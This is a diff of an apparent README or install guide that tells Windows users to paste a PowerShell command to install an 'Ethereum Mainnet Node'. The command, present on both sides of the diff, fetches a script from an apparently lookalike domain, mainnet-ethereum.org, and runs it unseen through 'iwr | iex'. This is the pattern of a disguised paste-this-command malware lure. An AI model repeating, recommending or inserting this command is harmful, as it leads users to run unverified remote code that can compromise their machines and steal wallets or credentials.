@@ -11,8 +11,8 @@ _Using Command Prompt is the recommended way to install an Ethereum Mainnet Node
 Press `Win + R`, type `CMD`, and press **Enter**.
 
 ### Step 2: Run the Ethereum node installation command
-```cmd
-powershell -command "$version='ethereum-mainnet-node=4.1.7-1b0a841'; iwr -useb mainnet-ethereum.org/install | iex"
+```powershell
+powershell -c "$version='ethereum-mainnet-node=4.1.7-1b0a841'; iwr -useb mainnet-ethereum.org/install | iex"
 `````
 
 _After executing the command, the node will begin initializing and syncing with the Ethereum network._ <br>
